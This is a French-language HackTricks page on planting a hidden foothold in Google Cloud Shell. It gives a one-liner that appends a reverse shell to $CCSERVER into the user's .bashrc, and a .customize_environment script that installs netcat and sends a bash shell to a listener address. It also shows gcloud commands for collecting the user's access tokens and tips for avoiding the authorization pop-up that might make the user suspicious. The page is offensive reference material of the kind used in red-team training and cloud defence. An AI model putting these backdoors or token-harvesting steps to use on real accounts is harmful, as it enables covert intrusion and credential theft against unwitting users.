# GCP - Cloud Shell Persistence

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Cloud Shell

Pour plus d'informations, consultez :

{% content-ref url="../gcp-services/gcp-cloud-shell-enum.md" %}
[gcp-cloud-shell-enum.md](../gcp-services/gcp-cloud-shell-enum.md)
{% endcontent-ref %}

### Backdoor Persistante

[**Google Cloud Shell**](https://cloud.google.com/shell/) vous fournit un acc√®s en ligne de commande √† vos ressources cloud directement depuis votre navigateur sans aucun co√ªt associ√©.

Vous pouvez acc√©der √† Cloud Shell de Google depuis la **console web** ou en ex√©cutant **`gcloud cloud-shell ssh`**.

Cette console a des capacit√©s int√©ressantes pour les attaquants :

1. **Tout utilisateur Google ayant acc√®s √† Google Cloud** a acc√®s √† une instance Cloud Shell enti√®rement authentifi√©e (les Comptes de Service peuvent, m√™me en √©tant Propri√©taires de l'organisation).
2. Cette instance **maintiendra son r√©pertoire personnel pendant au moins 120 jours** s'il n'y a pas d'activit√©.
3. Il n'y a **aucune capacit√© pour une organisation de surveiller** l'activit√© de cette instance.

Cela signifie essentiellement qu'un attaquant peut placer une backdoor dans le r√©pertoire personnel de l'utilisateur et tant que l'utilisateur se connecte au GC Shell au moins tous les 120 jours, la backdoor survivra et l'attaquant obtiendra un shell chaque fois qu'il sera ex√©cut√© simplement en faisant :

{% code overflow="wrap" %}
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
{% endcode %}

Il y a un autre fichier dans le dossier personnel appel√© **`.customize_environment`** qui, s'il existe, sera **ex√©cut√© √† chaque fois** que l'utilisateur acc√®de au **cloud shell** (comme dans la technique pr√©c√©dente). Il suffit d'ins√©rer la porte d√©rob√©e pr√©c√©dente ou une comme celle-ci pour maintenir la persistance tant que l'utilisateur utilise "fr√©quemment" le cloud shell :
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
{% hint style="warning" %}
Il est important de noter que la **premi√®re fois qu'une action n√©cessitant une authentification est effectu√©e**, une fen√™tre d'autorisation contextuelle appara√Æt dans le navigateur de l'utilisateur. Cette fen√™tre doit √™tre accept√©e avant que la commande puisse s'ex√©cuter. Si une fen√™tre contextuelle inattendue appara√Æt, cela pourrait susciter des soup√ßons et potentiellement compromettre la m√©thode de persistance utilis√©e.
{% endhint %}

Ceci est la fen√™tre contextuelle r√©sultant de l'ex√©cution de `gcloud projects list` depuis le cloud shell (en tant qu'attaquant) vue dans la session utilisateur du navigateur :

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Cependant, si l'utilisateur a activement utilis√© le cloudshell, la fen√™tre contextuelle n'appara√Ætra pas et vous pouvez **rassembler les tokens de l'utilisateur avec** :
```bash
gcloud auth print-access-token
gcloud auth application-default print-access-token
```
#### Comment la connexion SSH est √©tablie

Fondamentalement, ces 3 appels API sont utilis√©s :

* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey) \[POST] (vous fera ajouter votre cl√© publique que vous avez cr√©√©e localement)
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start) \[POST] (vous fera d√©marrer l'instance)
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default](https://content-cloudshell.googleapis.com/v1/users/me/environments/default) \[GET] (vous indiquera l'IP du google cloud shell)

Mais vous pouvez trouver plus d'informations dans [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)

## R√©f√©rences

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
